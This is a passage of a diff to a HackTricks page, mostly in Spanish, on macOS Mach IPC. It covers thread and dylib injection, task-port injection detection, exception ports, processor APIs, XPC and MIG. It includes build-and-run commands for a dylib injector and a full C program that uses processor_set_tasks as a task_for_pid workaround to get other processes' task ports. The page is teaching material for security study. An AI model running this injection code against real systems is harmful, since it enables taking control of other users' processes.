-Por lo tanto, para **mejorar el hilo**, se debe llamar a **`pthread_create_from_mach_thread`** que creará un pthread válido. Luego, este nuevo pthread podría **llamar a dlopen** para **cargar una dylib** desde el sistema, por lo que en lugar de escribir nuevo shellcode para realizar diferentes acciones, es posible cargar bibliotecas personalizadas.
+Por lo tanto, para **mejorar el hilo**, se debe llamar a **`pthread_create_from_mach_thread`** que creará un pthread válido. Luego, este nuevo pthread podría **llamar a dlopen** para **cargar una dylib** del sistema, por lo que en lugar de escribir nuevo shellcode para realizar diferentes acciones, es posible cargar bibliotecas personalizadas.
 
 Puedes encontrar **ejemplos de dylibs** en (por ejemplo, uno que genere un registro y luego puedas escucharlo):
 
@@ -1037,7 +1058,7 @@ kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64
 (thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );
 
 if (kr != KERN_SUCCESS) {
-fprintf(stderr,"No se puede crear un hilo remoto: error %s", mach_error_string (kr));
+fprintf(stderr,"No se puede crear el hilo remoto: error %s", mach_error_string (kr));
 return (-3);
 }
 
@@ -1068,7 +1089,7 @@ fprintf(stderr,"Dylib no encontrado\n");
 
 }
 ```
-</detalles>
+</details>
 ```bash
 gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
 ./inject <pid-of-mysleep> </path/to/lib.dylib>
@@ -1081,49 +1102,192 @@ En esta técnica se secuestra un hilo del proceso:
 [macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
 {% endcontent-ref %}
 
+### Detección de Inyección de Puerto de Tarea
+
+Cuando se llama a `task_for_pid` o `thread_create_*` se incrementa un contador en la estructura de tarea del kernel que puede ser accedido desde el modo de usuario llamando a `task_info(task, TASK_EXTMOD_INFO, ...)`
+
+## Puertos de Excepción
+
+Cuando ocurre una excepción en un hilo, esta excepción se envía al puerto de excepción designado del hilo. Si el hilo no la maneja, entonces se envía a los puertos de excepción de la tarea. Si la tarea no la maneja, entonces se envía al puerto del host que es gestionado por launchd (donde se reconocerá). Esto se llama triaje de excepciones.
+
+Tenga en cuenta que al final, por lo general, si no se maneja correctamente, el informe terminará siendo manejado por el demonio ReportCrash. Sin embargo, es posible que otro hilo en la misma tarea maneje la excepción, esto es lo que hacen las herramientas de informe de fallos como `PLCrashReporter`.
+
+## Otros Objetos
+
+### Reloj
+
+Cualquier usuario puede acceder a información sobre el reloj, sin embargo, para establecer la hora o modificar otras configuraciones se debe ser root.
+
+Para obtener información es posible llamar a funciones del subsistema `clock` como: `clock_get_time`, `clock_get_attributtes` o `clock_alarm`\
+Para modificar valores, se puede utilizar el subsistema `clock_priv` con funciones como `clock_set_time` y `clock_set_attributes`
+
+### Procesadores y Conjunto de Procesadores
+
+Las API de procesadores permiten controlar un único procesador lógico llamando a funciones como `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...
+
+Además, las API del **conjunto de procesadores** proporcionan una forma de agrupar varios procesadores en un grupo. Es posible recuperar el conjunto de procesadores predeterminado llamando a **`processor_set_default`**.\
+Estas son algunas API interesantes para interactuar con el conjunto de procesadores:
+
+* `processor_set_statistics`
+* `processor_set_tasks`: Devuelve una matriz de derechos de envío a todas las tareas dentro del conjunto de procesadores
+* `processor_set_threads`: Devuelve una matriz de derechos de envío a todos los hilos dentro del conjunto de procesadores
+* `processor_set_stack_usage`
+* `processor_set_info`
+
+Como se menciona en [**esta publicación**](https://reverse.put.as/2014/05/05/about-the-processor\_set\_tasks-access-to-kernel-memory-vulnerability/), en el pasado esto permitía eludir la protección mencionada anteriormente para obtener puertos de tarea en otros procesos para controlarlos llamando a **`processor_set_tasks`** y obteniendo un puerto de host en cada proceso.\
+Hoy en día necesitas ser root para usar esa función y está protegida, por lo que solo podrás obtener estos puertos en procesos no protegidos.
+
+Puedes intentarlo con:
+
+<details>
+
+<summary><strong>código de processor_set_tasks</strong></summary>
+````c
+// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
+//gcc ./port_pid.c -o port_pid
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/sysctl.h>
+#include <libproc.h>
+#include <mach/mach.h>
+#include <errno.h>
+#include <string.h>
+#include <mach/exception_types.h>
+#include <mach/mach_host.h>
+#include <mach/host_priv.h>
+#include <mach/processor_set.h>
+#include <mach/mach_init.h>
+#include <mach/mach_port.h>
+#include <mach/vm_map.h>
+#include <mach/task.h>
+#include <mach/task_info.h>
+#include <mach/mach_traps.h>
+#include <mach/mach_error.h>
+#include <mach/thread_act.h>
+#include <mach/thread_info.h>
+#include <mach-o/loader.h>
+#include <mach-o/nlist.h>
+#include <sys/ptrace.h>
+
+mach_port_t task_for_pid_workaround(int Pid)
+{
+
+host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
+mach_port_t   psDefault;
+mach_port_t   psDefault_control;
+
+task_array_t  tasks;
+mach_msg_type_number_t numTasks;
+int i;
+
+thread_array_t       threads;
+thread_info_data_t   tInfo;
+
+kern_return_t kr;
+
+kr = processor_set_default(myhost, &psDefault);
+
+kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
+if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
+mach_error("host_processor_set_priv",kr); exit(1);}
+
+printf("So far so good\n");
+
+kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
+if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }
+
+for (i = 0; i < numTasks; i++)
+{
+int pid;
+pid_for_task(tasks[i], &pid);
+printf("TASK %d PID :%d\n", i,pid);
+char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
+if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
+printf("Command line: %s\n", pathbuf);
+} else {
+printf("proc_pidpath failed: %s\n", strerror(errno));
+}
+if (pid == Pid){
+printf("Found\n");
+return (tasks[i]);
+}
+}
+
+return (MACH_PORT_NULL);
+} // end workaround
+
+
+
+int main(int argc, char *argv[]) {
+/*if (argc != 2) {
+fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
+return 1;
+}
+
+pid_t pid = atoi(argv[1]);
+if (pid <= 0) {
+fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
+return 1;
+}*/
+
+int pid = 1;
+
+task_for_pid_workaround(pid);
+return 0;
+}
+
+```
+
+````
+
+</details>
+
 ## XPC
 
-### Información básica
+### Basic Information
 
-XPC, que significa Comunicación entre Procesos XNU (el núcleo utilizado por macOS), es un marco para la **comunicación entre procesos** en macOS e iOS. XPC proporciona un mecanismo para realizar **llamadas de método seguras y asíncronas entre diferentes procesos** en el sistema. Es parte del paradigma de seguridad de Apple, permitiendo la **creación de aplicaciones con privilegios separados** donde cada **componente** se ejecuta con **solo los permisos necesarios** para realizar su trabajo, limitando así el daño potencial de un proceso comprometido.
+XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.
 
-Para obtener más información sobre cómo funciona esta **comunicación** y cómo **podría ser vulnerable**, consulta:
+For more information about how this **communication work** on how it **could be vulnerable** check:
 
 {% content-ref url="macos-xpc/" %}
 [macos-xpc](macos-xpc/)
 {% endcontent-ref %}
 
-## MIG - Generador de Interfaz Mach
+## MIG - Mach Interface Generator
 
-MIG fue creado para **simplificar el proceso de creación de código Mach IPC**. Esto se debe a que gran parte del trabajo para programar RPC implica las mismas acciones (empaquetar argumentos, enviar el mensaje, desempaquetar los datos en el servidor...).
+MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).
 
-MIC básicamente **genera el código necesario** para que el servidor y el cliente se comuniquen con una definición dada (en IDL -Lenguaje de Definición de Interfaz-). Aunque el código generado sea feo, un desarrollador solo necesitará importarlo y su código será mucho más simple que antes.
+MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.
 
-Para obtener más información, consulta:
+For more info check:
 
 {% content-ref url="macos-mig-mach-interface-generator.md" %}
 [macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
 {% endcontent-ref %}
 
-## Referencias
+## References
 
 * [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
 * [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
 * [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
 * [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
 * [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
-* [\*OS Internals, Volumen I, Modo de Usuario, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
+* [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
+* [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html)
 
 <details>
 
-<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Otras formas de apoyar a HackTricks:
+Other ways to support HackTricks:
 
-* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Obtén el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
